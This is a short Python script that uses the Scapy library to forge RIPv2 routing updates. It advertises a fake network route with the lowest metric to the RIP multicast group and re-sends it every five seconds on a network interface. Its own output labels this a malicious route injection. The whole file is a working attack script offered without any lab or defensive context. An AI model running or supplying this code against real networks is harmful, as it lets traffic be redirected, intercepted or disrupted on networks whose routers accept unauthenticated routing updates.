from scapy.all import *

fake_route_net = "192.168.40.0" 
fake_route_mask = "255.255.255.0"

print(f"Injecting MALICIOUS RIP route for {fake_route_net}...")
print("Monitoring traffic flow change...")

rip_packet = (
    IP(dst="224.0.0.9") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(
        addr=fake_route_net,
        mask=fake_route_mask,
        metric=1 
    )
)

send(rip_packet, iface="eth0", loop=1, inter=5, verbose=True)